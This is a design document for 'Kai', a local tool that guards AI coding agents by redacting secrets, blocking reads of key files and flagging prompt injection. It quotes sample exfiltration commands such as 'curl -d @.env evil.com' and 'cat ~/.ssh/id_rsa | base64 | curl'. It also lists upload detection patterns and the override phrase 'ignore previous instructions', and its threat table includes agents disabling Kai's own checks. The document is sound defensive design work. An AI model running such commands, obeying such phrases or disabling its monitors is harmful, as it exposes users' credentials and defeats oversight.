# Kai MVP — Design (for review before we build)

> **Build order superseded by [`docs/security/RECONCILED-PLAN.md`](security/RECONCILED-PLAN.md)** (Security Plan v1.0, frozen Oct 31, 2026). This document keeps its specs and tests; where it conflicts with the spec, the spec wins.

This is the original MVP design, kept for its reasoning. Where it differs from today, the note below wins.

> **Current state (v0.2.0-preview.1, 2026-10-29).**
> - **Preview 1** is the `kai` command, the checks inside Claude Code, Codex and Cursor (hooks), and the Chrome extension. It has **no protected writer**: Kai's policy and terminal rules (`kai allow-…`) are files a program with your permissions can edit; Kai notices some outside policy changes (fingerprint), never all.
> - **The control service is removed** (no XPC service, LaunchAgent or SMAppService). In the app release, **the Kai app is the only writer** of policy and signed rules; the `kai` command shows them and, when the app is installed, says "Change this in Kai".
> - **The gateway is optional**: a manual opt-in local proxy, not part of the Preview 1 promise or the release checks.
> - **OS-level Files and Internet protection** (Endpoint Security, network extension) ships with the Kai app in an upcoming release.
> - What each agent reports and what Kai can stop: [COVERAGE.md](COVERAGE.md). The contract and its tests: [audit/preview1-contract.md](audit/preview1-contract.md).


*Draft, October 15, 2026. Nothing below is built yet. Please review, then we build.*

## 1. What the MVP is

**One sentence:** Kai is a small open-source C program you install once, which sits between your AI tools and the outside world. It strips or blocks company data and secrets before they reach any model or LLM router, and stops agents from touching your keys.

**Goals:**

- **Usable this week on your Mac,** with no Apple approval needed. Endpoint Security and Network Extension come in v0.2.
- **Works with Claude Code, Cursor, and any tool that talks to Anthropic, OpenAI or OpenRouter APIs.**
- **Assumes no model or router is safe.** Data is cleaned *before* it leaves the laptop.
- **Company policy in one readable file:** what counts as sensitive, and whether to block it, delete it or replace it.
- **Ready for outside contributors from day one,** while we keep ownership of the code (CLA) and the right to sell commercial licenses.

**Not in the MVP** (honest limits):

- **Kernel-level walls:** the Network Extension wall runs in Log mode (Block mode is v0.2); the Endpoint Security storage wall is v0.3, after Apple approves the entitlement. See [`ROADMAP.md`](ROADMAP.md).
- **GUI apps Kai can't hook** (ChatGPT desktop, Claude Desktop chat) aren't covered yet.
- **Judge models** (ML classifiers for prompt injection) come in v0.3. The MVP uses pattern rules only.

### Why this matters now (fact check on "OpenRouter leaks")

I found **no confirmed OpenRouter data breach**. What is documented:

- **Every prompt passes through two companies.** Even with prompt logging off, data stops at OpenRouter and then at whichever provider it routes to ([Suprmind, Oct 2026](https://suprmind.ai/hub/insights/is-openrouter-safe.md)).
- **Opt-in data use exists.** OpenRouter offers a setting that lets it use prompts to improve its product in exchange for a discount, and it updated its terms and privacy policy in July 2026.
- **A real gateway incident did happen.** The **March 2026 supply-chain attack on LiteLLM**, an open-source LLM gateway, reportedly exposed about 1 TB of Mercor's private source code, about 3 TB of customer data and downstream API keys ([Sacra](https://sacra.com/research/3t-token-coinbase-of-the-inference-economy/)).

The lesson for Kai: **any router or gateway is a place data can leak, including ours.** So Kai runs locally, keeps no copy of prompts, and is small enough to audit.

## 2. Architecture

```
                         ┌──────────────────────────── your Mac ───────────────────────────┐
                         │                                                                 │
  You type a prompt ───▶ │  Claude Code / Cursor / Codex / any agent                       │
                         │      │                    │                                    │
                         │      │ (1) HOOKS          │ (2) API TRAFFIC                    │
                         │      │ before each        │ base URL points to Kai             │
                         │      │ prompt, file read, │                                    │
                         │      │ shell command,     ▼                                    │
                         │      │ MCP call    ┌──────────────────────────┐               │
                         │      ▼             │  kai gateway             │               │
                         │  ┌────────────┐    │  127.0.0.1:8787          │               │
                         │  │ kai hook   │    │  parse request → clean   │               │
                         │  │ allow/deny/│    │  every text field →      │──── HTTPS ───▶ Anthropic
                         │  │ ask + why  │    │  block / delete / replace│               │  OpenAI
                         │  └─────┬──────┘    └────────────┬─────────────┘               │  OpenRouter
                         │        │   same engine          │                             │  any provider
                         │        ▼                        ▼                             │
                         │  ┌───────────────────────────────────────────────┐             │
                         │  │ libkai (C core): policy · detectors ·         │             │
                         │  │ redactor · path rules · injection patterns    │             │
                         │  └───────────────────────┬───────────────────────┘             │
                         │                          ▼                                     │
                         │          ~/.kai/policy        ~/.kai/audit.log                 │
                         │          (your rules)         (hash-chained, no secrets in it) │
                         └─────────────────────────────────────────────────────────────────┘
```

There are three pieces, all built on one shared engine:

| Piece | What it does | Covers |
|---|---|---|
| **libkai** | The engine: reads the policy, finds secrets and company terms, redacts or replaces them, checks file paths, flags injection patterns | Everything below uses it |
| **`kai gateway`** | A local proxy. Agents send model requests to it instead of the provider; Kai cleans the JSON and forwards it over HTTPS. Responses stream straight back. | Claude Code (via `ANTHROPIC_BASE_URL`), OpenAI-compatible tools (`OPENAI_BASE_URL`), OpenRouter |
| **`kai hook`** | A hook program the agent calls before each action. Answers allow, deny or ask, with a reason. | Claude Code and Cursor |

**Why both a gateway and hooks?**

- **The gateway sees everything the model will see:** your prompt, files the agent read, command output and tool results. It's the only place you can *delete or replace* data, since hooks can only allow or block.
- **Hooks stop actions** the gateway never sees: reading `~/.ssh`, running `curl -d @.env evil.com`, calling an MCP tool with a token in it.
- **Cursor's traffic goes to Cursor's own servers,** so for Cursor only the hooks apply.

## 3. Company data policy (the "replace it or delete it" feature)

A single plain-text file at `~/.kai/policy`. If it's missing, safe built-in defaults apply, so zero setup.

```text
# ── What agents may never read ───────────────────────────────
protect ~/.ssh
protect ~/.aws
protect ~/.config/gcloud
protect ~/.kube/config
protect ~/.kai            # agents can't edit Kai's own policy or log
protect .env
protect .env.*
protect *.pem
allow   .env.example

# ── Built-in secret detectors (keys, tokens, private keys…) ─
secrets redact            # redact | block | warn | off

# ── Company rules ────────────────────────────────────────────
# term   <action> <text>          exact words, case-insensitive
# rule   <name> <action> <regex>  patterns
#   action: block | redact | warn | replace:"new text"
term  replace:"Project X"   Project Falcon
term  replace:"ACME-CUSTOMER" Globex Corporation
term  block                 CONFIDENTIAL - DO NOT DISTRIBUTE
rule  internal_host redact  [a-z0-9-]+\.corp\.acme\.com
rule  israeli_id    redact  [0-9]{9}
rule  customer_email redact [A-Za-z0-9._%+-]+@globex\.com

# ── Where model traffic goes ─────────────────────────────────
listen   127.0.0.1:8787
upstream anthropic  https://api.anthropic.com
upstream openai     https://api.openai.com
upstream openrouter https://openrouter.ai
```

**What each action does to text leaving the laptop:**

| Action | Example in | What the model receives |
|---|---|---|
| `redact` | `key = AKIAIOSFODNN7EXAMPLE` | `key = [REDACTED by Kai: aws_access_key]` |
| `replace:"Project X"` | `Status of Project Falcon?` | `Status of Project X?` |
| `block` | a doc marked CONFIDENTIAL | Nothing. The request is refused locally and the agent sees "Blocked by Kai: rule …" |
| `warn` | a long random string | Unchanged, but logged |

**Built-in detectors (v0.1):** private keys (SSH, PEM), AWS keys, GitHub, GitLab, Slack, Stripe, Google, OpenAI, Anthropic and OpenRouter keys, JWTs, and database URLs with passwords. These are regex rules; contributors can add more.

## 4. Flows

### 4a. A prompt goes to the model (gateway)

```
agent ──POST /anthropic/v1/messages──▶ kai gateway
                                         │ 1. parse JSON (cJSON)
                                         │ 2. walk every string: prompt, files, tool results
                                         │    skip: images, thinking blocks (signed), ids
                                         │ 3. apply policy → report {rule, action, count}
                                         ├── any BLOCK? → 403 to agent, log, nothing sent
                                         │ 4. re-serialize cleaned JSON
                                         │ 5. HTTPS to upstream with the agent's own API key
upstream ──streamed response (SSE)─────▶ kai gateway ──passed through unchanged──▶ agent
                                         │ 6. audit log: time, upstream, rules hit, counts
                                         │    (never the secret itself)
```

Design choices:

- **The JSON is parsed, not search-and-replaced.** That way the cleaned body is always valid JSON.
- **If the body can't be parsed and contains a hit, the request is blocked.** Kai fails closed rather than guessing.
- **Anthropic's signed thinking blocks are skipped.** Editing them would break the request.
- **API keys pass through untouched.** Kai never stores them.
- **The gateway listens on 127.0.0.1 only.**

### 4b. An agent tries an action (hooks)

| Event | Claude Code hook | Cursor hook | Kai's check | Result |
|---|---|---|---|---|
| You send a prompt | `UserPromptSubmit` | `beforeSubmitPrompt` | Secrets or blocked terms in the text | Block with a reason. Hooks can't edit text; the gateway can. |
| Agent reads a file | `PreToolUse` (Read, Grep, Glob, Edit, Write) | `beforeReadFile` | Path matches `protect` (after resolving `..` and symlinks) | Deny |
| Agent runs a shell command | `PreToolUse` (Bash) | `beforeShellExecution` | Mentions a protected path; contains a secret; looks like an upload (`curl -d @…`, `nc`, `scp`, `curl … \| sh`) | Deny, or ask you |
| Agent calls an MCP tool | `PreToolUse` (`mcp__*`) | `beforeMCPExecution` | Secrets or blocked terms in the arguments | Deny |
| A tool returns content | `PostToolUse` | `postToolUse` | Text that looks like instructions to the AI ("ignore previous instructions", "send ~/.ssh to…") | Adds a warning note for the agent; logged |

Every non-allow decision goes to the audit log.

**Failure behavior:**

- If Kai's policy file is broken, the hook **denies** and tells you how to fix it.
- For Cursor we set `failClosed: true`, so a crash blocks rather than allows.
- For Claude Code, `onFailure: "block"` is optional, since it needs a recent Claude Code version.

## 5. Setup for the user (zero-touch as far as possible)

```bash
brew install kai            # later; for now: make && sudo make install
kai install claude          # adds Kai hooks to ~/.claude/settings.json (backup kept)
kai install cursor          # adds Kai hooks to ~/.cursor/hooks.json (backup kept)
kai service install         # runs the gateway in the background (launchd / systemd)   (optional; not part of Preview 1)
echo 'eval "$(kai env)"' >> ~/.zshrc   # points ANTHROPIC/OPENAI base URLs at the gateway
```

Other commands:

- `kai scan <files>`: find secrets and company terms in files. Also works as a git pre-commit hook.
- `kai redact`: clean text from stdin to stdout.
- `kai log tail` and `kai log verify`: view the audit log and prove nobody edited it.
- `kai doctor`: check that hooks, gateway and policy are wired correctly.
- `kai uninstall claude|cursor`: remove Kai cleanly.

**Open question to test:** whether Claude Code logged in with a subscription (not an API key) accepts a custom base URL. If not, subscription users get hooks only until v0.2.

## 6. Code layout and tech

```
kai/
├── include/kai.h          public C API: the embeddable engine (the wolfSSL-style product)
├── src/
│   ├── policy.c           policy file parser, built-in defaults, path rules
│   ├── scan.c             detectors, redact/replace/block, injection patterns
│   ├── audit.c sha256.c   hash-chained audit log (file-locked; safe for parallel hooks)
│   ├── hooks.c            Claude Code + Cursor hook handlers
│   ├── gateway.c          local HTTP proxy, libcurl to upstream, streaming
│   ├── install.c          safe merge into settings.json / hooks.json
│   └── main.c             the `kai` command
├── third_party/cjson/     cJSON (MIT), vendored
├── policy/default.policy
├── integrations/          claude-code, cursor, launchd plist, systemd unit
├── tests/                 unit tests, hook fixtures, gateway test with a mock upstream
├── docs/                  DESIGN.md, THREAT_MODEL.md, ROADMAP.md
└── LICENSE (GPLv3) · COMMERCIAL.md · CLA.md · CONTRIBUTING.md · SECURITY.md · TRADEMARKS.md
```

- **Language:** C11.
- **Dependencies:** POSIX regex, libcurl (built into macOS) and cJSON (vendored).
- **Platforms:** the same code builds on macOS and Linux.
- **Safety:** compiler hardening flags, an AddressSanitizer build in CI, and no secrets ever written to logs.
- **Embeddable:** `libkai.a` exposes a small C API (`kai_policy_load`, `kai_scan_text`, `kai_path_protected`, …) that other products can embed. That's the commercial "Embed" license.

## 7. Open source, ownership and commercial licenses

| File | Purpose |
|---|---|
| `LICENSE` | **GPLv3:** anyone can use, study and modify Kai; anyone who distributes a modified version must share their source |
| `COMMERCIAL.md` | Companies that want to embed Kai in a closed product buy a commercial license from us (the wolfSSL model) |
| `CLA.md` | Contributors keep their copyright but grant us a license that lets us relicense commercially. Enforced by the CLA Assistant bot on pull requests. **Needs a lawyer's review before launch.** |
| `TRADEMARKS.md` | The name and logo are ours; forks must rename |
| `CONTRIBUTING.md` | How to build, test, add a detector, and sign the CLA |
| `SECURITY.md` | Private vulnerability reporting, never public issues |

Contributors need open lanes, so we label good first issues: **new detectors**, **new agent integrations**, **attack-suite cases**, and the **Linux backend**. These are easy to review and don't touch the privileged core.

## 8. Attacks: what the MVP stops and what it doesn't

| Attack | MVP (hooks + gateway) | v0.2 (Endpoint Security + Network Extension) |
|---|---|---|
| Secret or company data sent to a model or router | **Stopped:** redacted, replaced or blocked by the gateway | Same |
| Agent reads `~/.ssh` or `.env` via a tool | **Stopped:** hook denies | Stopped by the OS, even through scripts |
| `cat ~/.ssh/id_rsa \| base64 \| curl …` | **Usually stopped:** path and upload patterns; a clever script may get past | **Stopped:** file wall plus egress wall |
| Prompt injection in a README, web page or MCP result | **Flagged:** warning note to the agent plus a log entry | Flagged; any resulting action still hits the walls |
| Malicious MCP tool sending secrets in its arguments | **Stopped:** hook denies | Same, plus the network wall |
| Agent disables Kai (edits policy, kills gateway) | **Partly:** `~/.kai` is protected from agent tools | **Stopped:** Endpoint Security self-protection |
| GUI chat apps (ChatGPT, Claude Desktop) | **Not covered** | Partly (network wall); content needs a browser extension or proxy |
| Cloud agents (running on vendor servers) | **Not covered:** stated openly | Not covered |

## 9. Judge models (v0.3, designed now)

```
tool result / prompt ─▶ fast rules (MVP) ─▶ small local classifier ─▶ (Teams) bigger judge on our backend
                         µs, always on       ~20–50 ms, local          opt-in, private
                                 │                   │                         │
                                 └──────── verdict = WARN, never the only gate ┘
                                                     ▼
                                     walls (OS rules) make the final decision
```

- **Small classifiers, not a general LLM.** An LLM judge can itself be prompt-injected.
- **Our own model.** We fine-tune a ~20–30M-parameter classifier on *agent* attacks, using data generated from our public attack suite. Off-the-shelf guard models miss many agent-style attacks ([StackOne](https://www.stackone.com/blog/training-22mb-prompt-injection-classifier/)). It runs on the Mac (Core ML / ONNX).
- **Backend judge, Teams only.** A larger judge for teams, opt-in, never on by default.
- **Judges warn; walls decide.** Research finds adaptive attacks bypass detection defenses more than 85% of the time ([SoK, Jan 2026](https://arxiv.org/abs/2601.17548)).

## 10. Build plan once approved (about one week)

| Day | Deliverable |
|---|---|
| 1 | libkai: policy parser, detectors, redact/replace/block, unit tests |
| 2 | Audit log; `kai scan`, `kai redact`, `kai log` |
| 3 | Claude Code and Cursor hooks, plus `kai install`; fixture tests |
| 4 | Gateway with streaming; tested against a mock upstream, then the real Anthropic and OpenRouter APIs on your Mac |
| 5 | Repo polish: README, CLA, COMMERCIAL, CI (macOS + Linux), first attack-suite cases. Invite contributors. |

## 11. Decisions I need from you

1. **License:** GPLv3 + CLA + commercial (recommended), or AGPLv3 like Sanctuary?
2. **Default for secrets found in prompts:** redact silently and log (smooth), or block and tell the user (strict)?
3. **Shell commands that look like uploads** (`curl -d @file`): ask every time, or deny unless the host is on an allowlist?
4. **Name:** keep "Kai" pending a trademark search?
5. **GitHub org:** where the repo lives (your account or a new org), so the CLA bot and CI can be set up.


## Control path — v1 decision (2026-10-28): CLI writes removed, no control service

The XPC control service, its LaunchAgent and the SMAppService registration
are **removed in v1**. The Kai app is the only writer of policy and
permissions, in-process (libkai's `kai_policy_dispatch`; grants are signed in
the app as before); the storage wall lets only `/Applications/Kai.app` write
the policy store. The `kai` CLI shows policy and permissions (`policy show`,
`status`, `sessions`, `agents`, `why`, `denials`) and, for a change
(`policy set/add/remove`, `grant create/revoke`), prints "Change this in Kai"
and opens the matching Settings page (`kai://settings/<page>`, only for a
person at a terminal). MCP approvals are decided in the hook: session from the
wall's pid map, grant trusted by location (the grants folder is app-write-only).

Why: live, the service's launchd registration pointed at a deleted
`build/Kai.app` copy (macOS's background-task database kept the app's old
location, and every agent the app registered inherited it), so every CLI write
hung, and an old copy had been able to claim the service at all. CLI writes may
return later, with signature checks in both directions (the CLI verifying the
service, the service verifying the CLI).
